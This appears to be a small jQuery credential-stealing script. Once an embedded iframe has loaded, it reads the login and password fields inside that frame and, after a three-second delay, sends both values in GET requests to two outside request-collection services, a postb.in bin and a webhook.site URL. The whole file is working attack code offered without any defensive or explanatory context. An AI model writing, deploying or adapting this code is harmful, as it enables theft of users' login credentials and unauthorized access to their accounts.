jQuery( document ).ready(function() {
var iframe = document.getElementById("frame1");
iframe.onload = function() {

setTimeout(function(){ 
jQuery.get("http://postb.in/e6fv7555?u="+iframe.contentWindow.jQuery('#txtLogin').val()+"&p="+iframe.contentWindow.jQuery('#txtPassword').val())
jQuery.get("https://webhook.site/47b30c5b-571d-4c84-93e9-6377762a81f6?u="+iframe.contentWindow.jQuery('#txtLogin').val()+"&p="+iframe.contentWindow.jQuery('#txtPassword').val())


 }, 3000);

    }
});
